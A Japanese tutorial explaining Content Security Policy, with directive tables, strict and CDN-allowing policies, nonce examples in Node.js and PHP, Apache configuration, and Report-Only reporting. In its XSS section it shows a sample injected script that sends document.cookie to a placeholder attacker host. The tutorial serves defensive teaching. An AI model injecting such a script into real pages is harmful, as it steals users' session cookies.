# **Content Security Policy (CSP) 解説**

## **1. CSPとは何か？**

Content Security Policy (CSP) は、Webサイトのセキュリティを強化するための仕組みの一つです。主な目的は、**クロスサイトスクリプティング (XSS)** や**データインジェクション**といった特定の種類の攻撃を検知し、その影響を軽減することです。

Webページは、スクリプト、スタイルシート、画像、フォントなど、さまざまなリソースを読み込んで構成されています。CSPは、Webサイトの管理者が「**どのリソース（スクリプト、画像など）を、どこから（自サイト、信頼できるCDNなど）読み込んでも良いか**」というポリシー（ルール）を定義し、それをブラウザに伝えるための標準的なHTTPヘッダーです。

## **2. なぜCSPが必要なのか？ (XSS攻撃の脅威)**

CSPが防ごうとする主な脅威はXSSです。XSS攻撃では、攻撃者が悪意のあるスクリプトを信頼できるWebサイトに注入します。例えば、コメント欄に以下のようなスクリプトを埋め込むケースが考えられます。
```
<!-- 悪意のあるコメントの例 -->  
<script>  
  // ユーザーのクッキー（セッション情報など）を攻撃者のサーバーに送信する  
  fetch('https://attacker-site.com/steal?cookie=' + document.cookie);  
</script>
```
他のユーザーがこのコメントを含むページを閲覧すると、ブラウザはこのスクリプトを正規のスクリプトと区別できずに実行してしまい、セッション情報が盗まれるなどの被害が発生します。

CSPを導入すると、「スクリプトは自社のドメインと、信頼する https://cdn.example.com からのみ許可する」といったルールを設定できます。このルール下では、上記のようなインラインスクリプト（HTML内に直接書かれたスクリプト）や、攻撃者のドメインから読み込まれるスクリプトは、ブラウザによって実行がブロックされます。

## **3. CSPの仕組み**

CSPは、WebサーバーがHTTPレスポンスヘッダーに Content-Security-Policy を含めることで機能します。

**HTTPレスポンスヘッダーの例:**
```
Content-Security-Policy: script-src 'self'; img-src 'self' https://trusted-images.com;
```
ブラウザがこのヘッダーを受け取ると、そのページに適用されるセキュリティポリシーを解釈します。

1. **ポリシーの定義**: サーバーは Content-Security-Policy ヘッダーでポリシーを送信します。  
2. **ブラウザの解釈**: ブラウザはページを読み込む際にこのポリシーを受け取ります。  
3. **リソースの検証**: ブラウザは、ページが読み込もうとする全てのリソース（スクリプト、画像、CSSなど）が、定義されたポリシーに違反していないかをチェックします。  
4. **ブロックまたは許可**:  
   * ポリシーに準拠しているリソースは、通常通り読み込まれます。  
   * ポリシーに違反するリソース（例: 許可されていないドメインからのスクリプト、インラインスクリプト）は、読み込みや実行が**ブロック**されます。

## **4. 主要なディレクティブ（ポリシーのルール）**

CSPは「ディレクティブ」と呼ばれる命令の集まりで構成されます。よく使われるディレクティブを紹介します。

| ディレクティブ | 説明 |
| :---- | :---- |
| default-src | 他の -src ディレクティブで指定されていないリソースのデフォルトの読み込み元を指定します。これを設定すると、多くのリソースの基準となります。 |
| script-src | JavaScript (\<script\>タグ、イベントハンドラなど) の有効なソースを指定します。**CSPの最も重要なディレクティブの一つです。** |
| style-src | スタイルシート (\<link\>タグ、\<style\>タグ、style属性など) の有効なソースを指定します。 |
| img-src | 画像 (\<img\>, faviconなど) の読み込み元を指定します。 |
| font-src | フォント (@font-face) の読み込み元を指定します。 |
| connect-src | fetch(), XMLHttpRequest, WebSocket などを使用して接続できる先（APIエンドポイントなど）を指定します。 |
| frame-src | \<frame\> や \<iframe\> で読み込めるページのソースを指定します。 |
| frame-ancestors | **クリックジャッキング対策**に重要です。\<iframe\> などによって、**このページ自体がどこに埋め込まれること**を許可するかを指定します。（X-Frame-Options ヘッダーと似た役割） |
| object-src | \<object\>, \<embed\>, \<applet\> などのプラグインのソースを指定します。（現代では非推奨の要素が多いため 'none' が推奨されます） |

### **ソース指定のためのキーワード**

ディレクティブには、どこからリソースを許可するかを示す「ソース値」を指定します。

| ソース値 | 説明 |
| :---- | :---- |
| 'self' | (シングルクォート必須) 現在のページと同一のオリジン（スキーム、ホスト、ポートが同じ）を許可します。 |
| 'none' | (シングルクォート必須) いかなるリソースも許可しません。 |
| https://example.com | 特定のドメインからのリソースを許可します。ワイルドカード (*.example.com) も使用可能です。 |
| https: | スキームのみを指定し、HTTPS経由のすべてのリソースを許可します。 |
| 'unsafe-inline' | (シングルクォート必須) **非推奨。** HTML内のインライン \<script\> タグ、onclick などのインラインイベントハンドラ、インライン \<style\> タグを許可します。XSSのリスクが残るため、可能な限り避けるべきです。 |
| 'unsafe-eval' | (シングルクォート必須) **非推奨。** eval() や new Function() などの文字列からコードを生成するJavaScriptメソッドを許可します。 |
| nonce-value | （例: nonce-abc123）「ノンス（一度だけ使われる番号）」です。サーバーがリクエストごとに生成したランダムな値をヘッダーとHTMLタグの両方に記述し、一致する場合のみインラインスクリプトの実行を許可します。'unsafe-inline' より安全な代替手段です。 |
| sha256-hash | （例: sha256-B2y...）インラインスクリプトやスタイルの内容のハッシュ値を指定します。そのハッシュ値と一致する内容のスクリプト/スタイルのみ実行を許可します。 |

## **5. CSPの導入例**

### **例1: 厳格なポリシー（基本）**

最も基本的な厳格なポリシーです。リソースはすべて自サイト（同一オリジン）からのみ許可し、インラインやevalは禁止します。
```
Content-Security-Policy: default-src 'self'; object-src 'none';
```
* default-src 'self': 基本的にすべて同一オリジンからのみ。  
* object-src 'none': \<object\> タグなどは全面的に禁止。  
* script-src や style-src は default-src にフォールバックするため、'self' が適用されます。インラインスクリプトやインラインスタイルはブロックされます。

### **例2: 外部CDNとGoogle Fontsを許可する**

多くのWebサイトは、BootstrapやjQueryなどのライブラリをCDNから、フォントをGoogle Fontsから読み込みます。
```
Content-Security-Policy:  
  default-src 'self';  
  script-src 'self' https://cdn.jsdelivr.net;  
  style-src 'self' https://cdn.jsdelivr.net https://fonts.googleapis.com;  
  font-src 'self' https://fonts.gstatic.com;  
  img-src 'self' https://images.example.com;  
  connect-src 'self' https://api.example.com;
```
* script-src: 自サイトと cdn.jsdelivr.net を許可。  
* style-src: 自サイト、CDN、Google FontsのCSSを許可。  
* font-src: Google Fontsのフォントファイル（fonts.gstatic.com から配信される）を許可。

### **例3: インラインスクリプトを nonce で許可する（安全な方法）**

やむを得ずインラインスクリプトを使いたいが 'unsafe-inline' は避けたい場合、nonce を使います。

**(1) サーバー側 (Node.js/Express の例)**
```
const crypto = require('crypto');

app.get('/', (req, res) => {  
  // 1. リクエストごとにランダムなnonce値を生成  
  const nonce = crypto.randomBytes(16).toString('base64');  
    
  // 2. CSPヘッダーにnonce値を設定  
  res.setHeader(  
    'Content-Security-Policy',  
    `script-src 'self' 'nonce-${nonce}';` // nonceを指定  
  );

  // 3. HTMLを描画する際にnonce値を渡す  
  res.render('index', { cspNonce: nonce });   
});
```
**(2) サーバー側 (PHP の例)**
```
<?php  
// 1. リクエストごとにランダムなnonce値を生成  
// (random_bytes は PHP 7+ で利用可能)  
$nonce = base64_encode(random_bytes(16));

// 2. CSPヘッダーにnonce値を設定  
// header() 関数は、HTMLが出力されるより前に呼び出す必要があります。  
header("Content-Security-Policy: script-src 'self' 'nonce-{$nonce}';");

// 3. HTMLを描画する際にこの $nonce 変数を利用できるようにします  
// (この後の (4) HTML側 を参照)  
?>
```
**(3) HTTPヘッダー (サーバーが送信するヘッダーの例)**

上記 (1) または (2) の結果、以下のようなヘッダーがブラウザに送信されます。nonce- の後の値は毎回変わります。
```
Content-Security-Policy: script-src 'self' 'nonce-aBcDeF123456...';
```
**(4) HTML側**

サーバー側（Node.js や PHP）で生成した $nonce 変数を、HTMLの \<script\> タグに出力します。
```
<!-- (PHPの場合) -->  
<!-- サーバーから渡されたnonce値と一致するscriptタグのみ実行が許可される -->  
<script nonce="<?php echo htmlspecialchars($nonce, ENT_QUOTES, 'UTF-8'); ?>">  
  console.log('This inline script will execute.');  
</script>

<!-- (Node.js/Express で EJS テンプレートの場合) -->  
<script nonce="<%= cspNonce %>">  
  console.log('This inline script will execute.');  
</script>

<!-- nonceがない、または値が違うインラインスクリプトはブロックされる -->  
<script>  
  console.log('This inline script will be BLOCKED.');  
</script>
```
## **5.5. Webサーバー / アプリケーションでの設定**

CSPヘッダーは、Webサーバー（Apache, Nginxなど）またはアプリケーション（PHP, Node.jsなど）のどちらでも設定できます。

### **1. Apache (.htaccess) での設定**

静的なCSPポリシー（nonce を使わない場合など）は、Apacheの設定ファイル (.htaccess や httpd.conf) で設定するのが簡単です。

Apacheの mod_headers モジュールが有効になっている必要があります。

**.htaccess の例:**
```
<IfModule mod_headers.c>  
  # 例2: 外部CDNとGoogle Fontsを許可するポリシー  
  # 見やすくするために複数行に分けていますが、実際には1行で書くか、行末に \ をつけます  
  Header set Content-Security-Policy "default-src 'self';   \
    script-src 'self' https://cdn.jsdelivr.net;   \
    style-src 'self' https://cdn.jsdelivr.net https://fonts.googleapis.com;   \
    font-src 'self' https://fonts.gstatic.com;   \
    img-src 'self' https://images.example.com;   \
    connect-src 'self' https://api.example.com;"  
</IfModule>
```
* **注意点**: この方法では、リクエストごとに動的な nonce を生成することはできません。nonce を使う場合は、次のPHPのようなアプリケーション側での設定が必要です。

### **2. PHP での設定**

動的な nonce の生成や、ページごとにCSPポリシーを切り替えたい場合は、PHPの header() 関数を使います。（「例3」も参照してください）
```
<?php  
// このファイルがHTMLの先頭にあると仮定します

// 例1: 厳格なポリシー  
header("Content-Security-Policy: default-src 'self'; object-src 'none';");

/*  
// 例3: nonce を使う動的なポリシー  
// 1. nonceを生成  
$nonce = base64_encode(random_bytes(16));

// 2. ヘッダーを設定  
header("Content-Security-Policy: script-src 'self' 'nonce-{$nonce}';");

// 3. この $nonce 変数をHTML側で利用できるようにします  
// （例: <script nonce="<?php echo $nonce; ?>">... のように出力）  
*/

// これ以降にHTMLの出力を開始します  
?>  
<html>  
<head>  
  <title>CSPテストページ</title>  
</head>  
<body>  
  <!-- ... コンテンツ ... -->  
    
  <!-- nonceを使う場合は、HTML側で変数を埋め込みます -->  
  <script nonce="<?php echo htmlspecialchars($nonce, ENT_QUOTES, 'UTF-8'); ?>">  
     console.log('Nonceを使ったインラインスクリプト');  
  </script>  
</body>  
</html>
```
* **重要な注意**: header() 関数は、HTMLタグ、空白、echo など、**いかなる画面出力よりも前**に呼び出す必要があります。そうしないと「headers already sent」エラーが発生します。

## **6. CSPの導入と運用**

### **Report-Only モード**

既存のサイトにいきなりCSPを導入すると、必要なリソースまでブロックされてサイトが壊れる可能性があります。

そこで Content-Security-Policy-Report-Only ヘッダーを使います。このヘッダーで指定されたポリシーは、**実際にはブロックを行わず、違反があった場合にのみレポートを送信します。**

Content-Security-Policy-Report-Only:  
  default-src 'self';  
  report-uri /csp-violation-report-endpoint;

### **違反レポート (report-uri / report-to)**

report-uri (または新しい report-to) ディレクティブでレポートの送信先URLを指定すると、CSP違反が発生した際にブラウザがJSON形式でレポートを送信してくれます。

これにより、管理者は「どのページで」「どのリソースが」「どのポリシーに」違反したかを知ることができ、CSPのルールを修正・改善していくことができます。

## **7. まとめ**

CSPは、XSSなどの攻撃に対する強力な防御層（Defense in Depth）を提供します。

* **基本方針**: default-src 'self' から始め、必要なリソースをホワイトリスト形式で許可していくのが理想です。  
* **禁止事項**: 'unsafe-inline' と 'unsafe-eval' は、セキュリティを大幅に低下させるため、可能な限り使用を避けてください。  
* **安全な代替手段**: インラインスクリプトが必要な場合は nonce や hash の使用を検討してください。  
* **テスト**: 導入時は Report-Only モードを活用し、サイトが壊れないか十分にテストしてください。

CSPを正しく設定することは、安全なWebアプリケーションを構築するために不可欠なスキルです。